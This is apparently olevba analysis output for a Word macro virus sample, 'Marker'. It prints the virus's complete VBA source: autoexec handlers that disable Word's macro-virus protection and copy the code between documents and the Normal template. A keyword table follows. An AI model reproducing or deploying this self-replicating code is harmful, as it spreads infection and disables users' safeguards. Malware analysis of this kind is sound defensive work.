olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.km
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.km - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim x1, x2, x3, x4 As Boolean
Dim x5, x6 As Object
Dim x7, x8, x16 As Integer
Dim x9 As Date
Dim x10, x11, x12, x13, x14 As String
Const x15 = ":-D you are marked!"
Private Sub Document_Close()
On Error Resume Next
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

If x3 = True Then
    x13 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
 ElseIf x4 = True Then
    x13 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
 End If

 If (x3 = True Xor x4 = True) And _
 (ActiveDocument.SaveFormat = wdFormatDocument Or _
    ActiveDocument.SaveFormat = wdFormatTemplate) Then

      If x3 = True Then
        x2 = NormalTemplate.Saved
        x11 = x5.CodeModule.Lines(1, x5.CodeModule.CountOfLines)
         x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
         x6.CodeModule.AddFromString x11

         If x2 = True Then NormalTemplate.Save
      End If
    If x4 = True Or ActiveDocument.Saved = False Then
    x1 = ActiveDocument.Saved
    x11 = x6.CodeModule.Lines(1, x6.CodeModule.CountOfLines)
     x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
     x5.CodeModule.AddFromString x11

     If x1 = True Then ActiveDocument.Save
   End If
  
    
 End If

 End Sub

Private Sub Document_New()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If

End Sub

Private Sub Document_Open()
Set x5 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x6 = NormalTemplate.VBProject.VBComponents.Item(1)
x3 = x5.CodeModule.Find(x15, 1, 1, 10000, 10000)
x4 = x6.CodeModule.Find(x15, 1, 1, 10000, 10000)
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
If x4 = False Then
    x6.CodeModule.DeleteLines 1, x6.CodeModule.CountOfLines
End If
If x3 = False Then
        x5.CodeModule.DeleteLines 1, x5.CodeModule.CountOfLines
End If
End Sub
























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

